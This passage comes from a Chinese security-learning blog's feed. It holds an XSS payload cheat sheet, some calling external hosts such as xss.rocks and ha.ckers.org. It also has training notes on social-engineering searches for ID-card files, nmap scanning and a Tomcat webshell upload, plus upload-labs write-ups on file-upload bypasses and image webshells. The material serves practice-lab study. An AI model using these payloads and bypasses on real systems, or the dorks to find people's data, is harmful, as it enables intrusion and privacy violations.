class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(“<span class="variable constant_">XSS</span>”);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’)”</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘XSS’);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”IMAGE”</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’);”</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">”javascript:alert(‘XSS’)”</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">’vbscript:msgbox(“XSS”)’</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BR</span> <span class="attr">SIZE</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">HREF</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">CLASS</span>=<span class="string">XSS</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span>&gt;</span><span class="tag">&lt;<span class="name">TD</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">SRC</span>=<span class="string">&quot;httx://xss.rocks/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">document.domain</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">M</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.domain)</span>&gt;</span>M</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">oNeRrOr</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">OnErRoR</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(<span class="symbol">&amp;quot;</span>M<span class="symbol">&amp;quot;</span>)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mArQuEe</span> <span class="attr">OnScRoLl</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">MaRqUeE</span> <span class="attr">oNsCrOlL</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/0/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/00/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/000/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/M/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">,alert(1)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">,alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="number">1</span><span class="comment">//@ sourceMappingURL=//xss.site</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span>.gif</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image:url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=&lt;<span class="attr">svg</span>/<span class="attr">o</span>&amp;#<span class="attr">x6E</span>;<span class="attr">load</span>&amp;<span class="attr">equals</span>;<span class="attr">alert</span>&amp;<span class="attr">lpar</span>;<span class="attr">1</span>)&amp;<span class="attr">gt</span>;&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://baidu.com</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span>&lt;/iframe</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span>M</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Link&quot;</span> <span class="attr">Content</span>=<span class="string">&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>官方README.md：</p>
<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<p>正好做了一部分，记录如下：</p>
<p><a href="http://got17.cn/1070/">【网络安全2x01】上传漏洞靶场upload-labs（Pass01-04）</a></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>burpsuite</tag>
        <tag>upload-labs</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x04】安恒厂家网络安全培训 --- day4</title>
    <url>/1074/</url>
    <content><![CDATA[<p>上午讲社会工程学，nmap工具的使用。</p>
<p>下午讲awvs工具的使用，中间件漏洞（tomcat8实例）。</p>
<span id="more"></span>

<h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><p>是一种通过人际交流的方式获得信息的非技术渗透手段。</p>
<p>就是猜。</p>
<p>一个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.谷歌搜索：</span><br><span class="line">filetype:xls 身份证</span><br><span class="line"></span><br><span class="line">2.审计微博、抖音等内容</span><br><span class="line"></span><br><span class="line">3.手机号搜微信、支付宝</span><br></pre></td></tr></table></figure>

<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#端口信息 Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span></span><br><span class="line">nmap -p- [url]</span><br><span class="line"></span><br><span class="line"><span class="comment">#操作系统信息</span></span><br><span class="line">nmap -O [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -Pn: Treat all hosts as online -- skip host discovery</span></span><br><span class="line">nmap -Pn [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon 扫描</span></span><br><span class="line">nmap -sS [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -v: 详细信息 (use -vv or more for greater effect)</span></span><br><span class="line">nmap -v [url]</span><br></pre></td></tr></table></figure>

<h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80 http</span><br><span class="line">8080 http</span><br><span class="line">8XXX debug</span><br><span class="line">7001 weblogic</span><br></pre></td></tr></table></figure>

<h1 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h1><p>win下安装与linux下安装类似：</p>
<p><a href="http://0verflow.cn/?p=1463">AWVS13破解版安装_kali</a></p>
<p>工具使用实例：</p>
<p><a href="http://got17.cn/1059/">【网络安全0x08】SQL注入之X-Forwarded-For参数注入</a></p>
<h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><p>tomcat8靶机实例：</p>
<ol>
<li><p>nmap扫描ip，找到web端口8080。</p>
</li>
<li><p>awvs扫描网站，找到可利用漏洞：弱口令登录漏洞。</p>
</li>
<li><p>登录后台，上传war包（压缩jsp大马，zip后缀改war）。</p>
</li>
<li><p>tomacat会把war包解压保存在同名目录下，访问大马。</p>
</li>
<li><p>查看网站信息、执行命令、文件管理等。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>nmap</tag>
        <tag>社会工程学</tag>
        <tag>awvs</tag>
        <tag>中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全2x02】上传漏洞靶场upload-labs（Pass05-12）</title>
    <url>/1075/</url>
    <content><![CDATA[<p>官方README.md：</p>
<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<p>本文记录Pass05-12。Pass05-10都是常见的改后缀绕过验证，Pass11-12是两种00截断绕过方式。</p>
<span id="more"></span>

<h1 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h1><p>大小写绕过。<code>.pHp</code>、<code>.Php</code>、<code>PHp</code>啥的都行。</p>
<p><img src="/1075/1.PNG"></p>
<h1 id="Pass06"><a href="#Pass06" class="headerlink" title="Pass06"></a>Pass06</h1><p>空格绕过，没有对首尾空格过滤，<code>1.php </code>即可。</p>
<p><img src="/1075/2.PNG"></p>
<h1 id="Pass07"><a href="#Pass07" class="headerlink" title="Pass07"></a>Pass07</h1><p>点绕过，没有末尾的点过滤，<code>1.php.</code>即可。</p>
<p><img src="/1075/3.PNG"></p>
<h1 id="Pass08"><a href="#Pass08" class="headerlink" title="Pass08"></a>Pass08</h1><p><code>::$DATA</code>绕过（win），没有对<code>::$DATA</code>过滤，<code>1.php::$DATA</code>即可。</p>
<p><img src="/1075/4.PNG"></p>
<h1 id="Pass09"><a href="#Pass09" class="headerlink" title="Pass09"></a>Pass09</h1><p>点空格点过滤，<code>1.php. .</code>即可。</p>
<p><img src="/1075/5.PNG"></p>
<h1 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h1><p>双写绕过，<code>1.phphpp</code>、<code>1.pphphp</code>均可。</p>
<p><img src="/1075/6.PNG"></p>
<h1 id="Pass11"><a href="#Pass11" class="headerlink" title="Pass11"></a>Pass11</h1><p>GET报文%00截断，修改文件后缀<code>.jpg</code>绕过文件后缀检测，修改保存目录为<code>../upload/1.php%00</code>，后面加截断使文件保存为<code>.php</code>格式。</p>
<p><img src="/1075/7.PNG"></p>
<h1 id="Pass12"><a href="#Pass12" class="headerlink" title="Pass12"></a>Pass12</h1><p>GET报文0x00截断，修改文件后缀<code>.jpg</code>绕过文件后缀检测，修改保存目录为<code>../upload/1.php%00</code>，<strong>选中<code>%00</code>右键转<code>URL-Decode</code>，或者点击<code>Hex</code>直接在16进制中修改</strong>，使文件保存为<code>.php</code>格式。</p>
<p><img src="/1075/8.PNG"></p>
<p><img src="/1075/9.PNG"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>burpsuite</tag>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全2x03】上传漏洞靶场upload-labs（Pass13-16）</title>
    <url>/1076/</url>
    <content><![CDATA[<p>官方README.md：</p>
<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<p>本文记录Pass13-16。这四关是图片马专项。</p>
<span id="more"></span>

<h1 id="常见图片文件头"><a href="#常见图片文件头" class="headerlink" title="常见图片文件头"></a>常见图片文件头</h1><ol>
<li>JPEG</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (2 bytes): <span class="variable">$ff</span>, <span class="variable">$d8</span> (SOI) (JPEG 文件标识) </span><br><span class="line">- 文件结束标识 (2 bytes): <span class="variable">$ff</span>, <span class="variable">$d9</span> (EOI)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>TGA</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 未压缩的前5字节    00 00 02 00 00</span><br><span class="line">- RLE压缩的前5字节   00 00 10 00 00</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>PNG</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>GIF</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (6 bytes)   47 49 46 38 39(37) 61</span><br><span class="line">                        G  I  F  8  9 (7)  a</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>BMP</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (2 bytes)   42 4D</span><br><span class="line">                        B  M</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>PCX</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (1 bytes)   0A</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>TIFF</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (2 bytes)   4D 4D 或 49 49</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>ICO</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (8 bytes)   00 00 01 00 01 00 20 20</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>CUR</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (8 bytes)   00 00 02 00 01 00 20 20</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>IFF</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (4 bytes)   46 4F 52 4D</span><br><span class="line">                        F  O  R  M</span><br></pre></td></tr></table></figure>

<ol start="11">
<li>ANI</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- 文件头标识 (4 bytes)   52 49 46 46</span><br><span class="line">                        R  I  F  F</span><br></pre></td></tr></table></figure>

<h1 id="Pass13"><a href="#Pass13" class="headerlink" title="Pass13"></a>Pass13</h1><p>cmd制作图片马：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy 1.jpg/b + 1.php/a pass13.jpg</span><br></pre></td></tr></table></figure>

<p>访问<code>upload-labs/include.php?file=./upload/[new_name].jpg</code>即可利用文件包含漏洞执行图片中的php文件。</p>
<p><img src="/1076/1.PNG"></p>
<p>这关是对文件头前两字节进行比对判断文件类型，所以也可以直接上传php文件改文件头前两字节来实现绕过。</p>
<p>这里16进制不太好改，我这样改感觉还行：先在Raw下敲个回车(0d 0a)，再随便输一些字符，位数和要在16进制里改的位数一致，然后切到Hex下直接找(0d 0a)，后面跟着的就是你要修改的内容。</p>
<p>上传php文件，抓包在文件头加<code>ffd8</code>，上传成功，可以看到保存成了<code>.jpg</code>格式。</p>
<p><img src="/1076/2.PNG"></p>
<p><code>png</code>、<code>gif</code>处理方式类似，不过<code>gif</code>文件头是ascii编码，可以直接在Raw里修改。</p>
<p>除了命令行，也可以在010Editor里打开图片，16进制显示，在最后添加文本信息：</p>
<p><img src="/1076/3.PNG"></p>
<h1 id="Pass14"><a href="#Pass14" class="headerlink" title="Pass14"></a>Pass14</h1><p>本关使用getimagesize()检查是否为图片文件，添加相关位置的信息，或者直接传Pass13的图片马即可。</p>
<h1 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h1><p>本关需要开启php_exif模块：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.在php.ini文件中找到;extension=php_exif.dll，去掉前面的分号</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.在php.ini文件中找到;extension=php_mbstring.dll，去掉前面的分号，并将此行移动到extension=php_exif.dll之前，使之首先加载*。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.找到[exif]段，把下面语句的分号去掉。</span><br><span class="line">;exif.encode_unicode = ISO-<span class="number">8859</span>-<span class="number">15</span></span><br><span class="line">;exif.decode_unicode_motorola = UCS-<span class="number">2</span>BE</span><br><span class="line">;exif.decode_unicode_intel = UCS-<span class="number">2</span>LE</span><br><span class="line">;exif.encode_jis =</span><br><span class="line">;exif.decode_jis_motorola = JIS</span><br><span class="line">;exif.decode_jis_intel = JIS</span><br></pre></td></tr></table></figure>

<p>本关使用exif_imagetype()检查是否为图片文件，添加相关位置的信息，或者直接传Pass13的图片马即可。</p>
<h1 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h1><p>本关重新渲染了图片，依靠前面的图片马不好使了。</p>
<p>太难了，还是转几个博主的write-up好了：</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客 - Upload-Labs第Pass-16通关（二次渲染绕过） 详解</a></p>
<p><a href="https://github.com/LandGrey/upload-labs-writeup/">LandGrey - Upload-labs所有WriteUp </a></p>
<p>核心思想是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。</p>
<p>具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>burpsuite</tag>
        <tag>upload-labs</tag>
        <tag>010Editor</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x05】安恒厂家网络安全培训 --- day5</title>
    <url>/1077/</url>
    <content><![CDATA[<p>上午讲下一代防火墙、WAF功能介绍。</p>
<p>下午讲EDR、防篡改、DDOS功能介绍。</p>
<span id="more"></span>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>今天换了人，估计是产品经理，讲安全设备，既没实物、也没操作，就那么几张ppt翻来覆去，估计没少给客户讲吧（笑）。全是废话，浪费一天。</p>
<p>今天抽空做了upload-labs的pass05-16，后面是真的难，拿着writeup都不太会做，慢慢学吧。</p>
<p>双休日把dvwa的sql注入、xss攻击模块、文件包含模块的低中难度都做完，有时间再试试高难度。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x07】安恒厂家网络安全培训 --- day7</title>
    <url>/1079/</url>
    <content><![CDATA[<p>上午教室占用，休息。</p>
<p>下午讲了两个vulhub靶机，有XMLDecoder 反序列化漏洞，ActiveMQ反序列化漏洞。</p>
<span id="more"></span>

